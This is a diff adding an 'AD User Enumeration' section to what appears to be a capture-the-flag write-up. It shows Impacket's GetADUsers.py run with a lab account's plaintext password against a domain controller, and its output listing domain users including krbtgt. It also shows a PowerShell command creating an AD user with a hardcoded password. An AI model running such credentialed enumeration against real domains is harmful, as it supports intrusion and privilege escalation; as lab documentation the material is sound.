@@ -186,3 +186,17 @@ $Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force;
 $DCIP = "10.0.0.53";
 New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
 ```
+### AD User Enumeration
+```
+alabaster@ssh-server-vm:~/impacket$ GetADUsers.py  northpole.local/elfy:J4\`ufC49/J4766 -dc-ip 10.0.0.53  -all
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Querying 10.0.0.53 for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon           
+--------------------  ------------------------------  -------------------  -------------------
+alabaster                                             2023-12-25 01:03:23.191767  2023-12-25 20:06:12.892916 
+Guest                                                 <never>              <never>             
+krbtgt                                                2023-12-25 01:11:07.280803  <never>             
+elfy                                                  2023-12-25 01:13:30.792119  2023-12-25 19:01:53.713983 
+wombleycube                                           2023-12-25 01:13:30.901503  2023-12-25 20:43:19.132455 
+```
